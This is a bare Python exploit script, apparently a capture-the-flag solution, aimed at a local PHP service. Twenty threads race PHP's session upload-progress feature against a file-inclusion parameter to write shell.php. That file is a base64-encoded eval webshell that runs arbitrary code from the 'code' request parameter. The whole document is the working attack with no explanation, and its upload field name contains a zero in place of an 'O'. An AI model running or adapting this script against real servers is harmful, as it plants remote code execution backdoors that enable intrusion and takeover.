import requests
import threading
event=threading.Event()
def write():
    url = "http://127.0.0.1:12345/index.php"
    webshell = "SECURITY<?php file_put_contents('shell.php',base64_decode('PD9waHAgZXZhbCgkX1JFUVVFU1RbImNvZGUiXSk7Pz4='));?>"
    files = {"PHP_SESSI0N_UPLOAD_PROGRESS":(None,"aa"),"a":(webshell,"a")}
    cookies = {"PHPSESSID":"shell"}
    while not event.is_set():
        try:
            resp = requests.post(url,cookies=cookies,files=files,timeout=2)
        except:
            pass

def read():
    while not event.is_set():
        params = {"file":"/var/lib/php/sessions/sess_shell"}
        resp = requests.get('http://127.0.0.1:12345/index.php' , params=params)
        if 'SECURITY' in resp.text:
            event.set()
            print("[+] Get shell !!")

if __name__=="__main__":
    for i in range(10): 
        threading.Thread(target=write,args=()).start()
    for i in range(10):
        threading.Thread(target=read,args=()).start()
